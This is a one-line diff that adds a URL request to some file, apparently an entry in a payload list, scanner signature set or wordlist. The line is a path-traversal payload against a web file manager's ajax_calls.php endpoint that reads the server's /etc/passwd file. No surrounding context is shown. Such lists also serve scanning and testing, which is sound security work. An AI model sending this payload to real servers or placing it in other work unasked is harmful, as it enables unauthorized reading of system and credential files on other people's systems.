@@ -1,0 +1,1 @@
+/filemanager/ajax_calls.php?action=get_file&sub_action=preview&preview_mode=text&title=source&file=../../../../etc/passwd
